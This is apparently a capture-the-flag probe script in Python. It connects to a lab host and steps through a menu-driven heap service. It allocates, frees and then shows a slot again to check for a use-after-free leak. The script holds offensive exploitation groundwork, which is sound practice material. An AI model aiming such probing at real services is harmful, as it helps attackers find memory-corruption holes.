import socket, time

HOST = "10.13.37.10"
PORT = 21968

class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=5)
        self.s.settimeout(2)
    def recv(self, t=1.0):
        buf = b""
        end = time.time() + t
        while time.time() < end:
            try:
                chunk = self.s.recv(4096)
                if chunk == b"":
                    break
                buf += chunk
            except socket.timeout:
                break
        return buf
    def cmd(self, data, t=1.0):
        if isinstance(data, str):
            data = data.encode()
        self.s.sendall(data + b"\n")
        return self.recv(t)
    def close(self):
        self.s.close()

c = Conn()
print(c.recv(1.0).decode(errors="replace"))

steps = [
    ("1", "new -> slot?"),
    ("0", "slot=0"),
    ("16", "len=16"),
    ("A"*16, "name data"),
    ("4", "show -> slot?"),
    ("0", "slot=0 show"),
    ("5", "cred"),
    ("6", "login (before corruption)"),
    ("3", "free -> slot?"),
    ("0", "slot=0 free"),
    ("4", "show -> slot?"),
    ("0", "slot=0 show AFTER FREE (uaf leak check)"),
]

for val, label in steps:
    r = c.cmd(val, 1.2)
    print(f"--- [{label}] sent {val!r} ---")
    print(r.decode(errors="replace"))

c.close()
